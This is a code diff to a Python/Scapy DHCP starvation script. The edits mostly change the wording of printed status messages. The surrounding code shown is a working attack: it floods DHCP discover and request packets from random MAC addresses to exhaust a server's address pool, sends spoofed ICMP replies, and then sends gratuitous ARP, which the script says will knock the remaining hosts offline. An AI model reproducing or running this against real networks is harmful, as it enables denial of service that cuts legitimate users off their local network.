@@ -167,7 +167,7 @@ class send_dhcp(threading.Thread):
             myxid=random.randint(1, 900000000)
             hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
             dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
-            print "\n\n\nSending DHCPDISCOVER on " + conf.iface
+            print "[--->] DHCP_Discover"
             sendp(dhcp_discover)
             time.sleep(timer)
 
@@ -186,7 +186,7 @@ class sniff_dhcp(threading.Thread):
         global dhcpdos
         while not self.kill_received and not dhcpdos:
             sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=3)
-            print "timeout waiting on dhcp packet count %d"%self.dhcpcount
+            print "[ !! ] timeout waiting on dhcp packet count %d"%self.dhcpcount
             self.dhcpcount+=1
             if self.dhcpcount==5: dhcpdos=True
           
@@ -207,7 +207,8 @@ class sniff_dhcp(threading.Thread):
                 localxid=pkt[BOOTP].xid
                 localm=unpackMAC(pkt[BOOTP].chaddr)
                 myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-                
+                print "[<---] DHCP_Offer   " + pkt[Ether].src,sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]"
+
                 if show_options:
                     b = pkt[BOOTP]
                     print "\t* xid=%s"%repr(b.xid)
@@ -224,17 +225,14 @@ class sniff_dhcp(threading.Thread):
                         else:
                             print "\t\t* ",o[0],o[1:]    
                 
-                print("DHCPOFFER handing out IP: "+myip)
-                if conf.verb: print("DHCPOFFER detected from " + pkt[Ether].src,sip + " on " + conf.iface + ", handing out IP: "+myip)
-                
                 dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
                 sendp(dhcp_req)
-                print "sent DHCP Request for "+myip
+                print "[--->] DHCP_Request "+myip
             elif ICMP in pkt:
                 if pkt[ICMP].type==8:
                     myip=pkt[IP].dst
                     mydst=pkt[IP].src
-                    if show_icmp: print "ICMP request from " + mydst + " for " + myip + " on " + conf.iface
+                    if show_icmp: print "[ <- ] ICMP_Request "+mydst+" for "+myip 
                     icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
                     if show_: 
                         print "%r"%icmp_req 
@@ -255,6 +253,7 @@ class sniff_dhcp(threading.Thread):
 #
 def main():
     checkArgs()
+    print "[INFO] - using interface %s"%conf.iface
     signal.signal(signal.SIGINT, signal_handler)
     global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
     dhcpsip=None
@@ -272,19 +271,20 @@ def main():
     
     while dhcpsip==None:
         time.sleep(1)
-        print "waiting for first DHCP Server response on " + conf.iface
+        print "[  ? ] \t\twaiting for first DHCP Server response"
     
     neighbors()
     release()
     
     while not dhcpdos:
         time.sleep(5)
-        print "waiting for DOS"
-      
-    print "DHCP Exhausted, knock all remaining hosts offline"
+        print "[  ? ] \t\twaiting for DHCP pool exhaustion..."
+        
+    print "[DONE] DHCP pool exhausted!"
+    print "[INFO] waiting 10s to mass grat.arp!"
     time.sleep(10)
     garp()
-    print "All done"
+    print "[DONE] DHCP pool exhausted!"
   
 def usage():
     print __doc__
